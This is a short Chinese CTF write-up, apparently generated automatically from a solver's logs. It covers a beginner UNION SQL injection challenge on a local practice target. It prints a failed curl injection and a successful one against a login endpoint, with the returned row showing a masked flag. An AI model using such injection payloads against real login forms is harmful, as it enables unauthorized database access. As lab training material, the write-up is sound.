---
title: r1-sqli-basic（Web）— range-v1 writeup
date: 2026-11-28 11:35:28
author: Xendr1a
categories: [CTF题解, range-v1]
tags: [range-v1, Writeup]
description: r1-sqli-basic：UNION 注入入门，登录接口回显查询行。
toc: true
---

## 摘要

- 赛事：range-v1
- 记录时间：2026-11-28 11:35:28 至 2026-11-28 11:35:34
- 题目：1 道
- 平台确认：0 道
- state.json 状态：done 1
- worker 轮次：2 条记录，合计 0.024 秒

## 时间线

- `2026-11-28 11:35:28` 发现 c1《r1-sqli-basic》（Web，1000 分）
- `2026-11-28 11:35:30` c1 第 1 轮启动
- `2026-11-28 11:35:31` c1 本轮未拿到 flag（0.012s，no such table: secret（SQL error））
- `2026-11-28 11:35:32` c1 第 2 轮启动
- `2026-11-28 11:35:33` c1 本轮拿到 flag（0.012s）

## 试错与回滚

### 失败与未获判定

- `2026-11-28 11:35:31` c1 本轮未拿到 flag（0.012s，no such table: secret（SQL error））
- c1《r1-sqli-basic》，state.json 记录 2 次尝试，当前状态 done

### NOTES.md 记录的排除方向与卡点

**c1 `work/1/NOTES.md`**
- 已排除方向：
  - 命令：`curl -s -G http://127.0.0.1:$HOST_PORT/login --data-urlencode "name=' UNION SELECT 1,secret,3 FROM secret--" --data-urlencode pw=x`
  - 环境：`HOST_PORT=12001`，rc=0，耗时 0.012s
  - 真实输出（末尾）：no such table: secret（SQL error）
  - 结论：这次没有拿到 flag；重跑用下面的成功命令，不要重复这条。

## 本地复现解法

本地复现，未获平台确认；记录自 solve 尝试日志，未独立核验

### c1 r1-sqli-basic

- 本地 solve 尝试（第 2 次尝试，rc=0，0.012s）：

```console
$ curl -s -G http://127.0.0.1:$HOST_PORT/login --data-urlencode "name=' UNION SELECT 1,secret,3 FROM secrets--" --data-urlencode pw=x
login
rows returned:
(1, 'flag{***}', 3)
```

## flag

- c1《r1-sqli-basic》：`flag{***}` **flag 未获平台确认，本地判定**

（flag 已打码；`--show-flag` 输出原文。）

## 记录来源

- 对局目录：`.chain-run`
- `logs/events.jsonl`：7 条记录
- `state.json`：1 条题目记录
- 题目工作目录：`work/1/NOTES.md`
- 容器生命周期（harness，不进时间线）：租到靶机（127.0.0.1:12001） → 释放靶机（chain-demo down -v）

本文件由 `writeup.py` 从上述落盘记录生成；记录中没有的内容不写入。
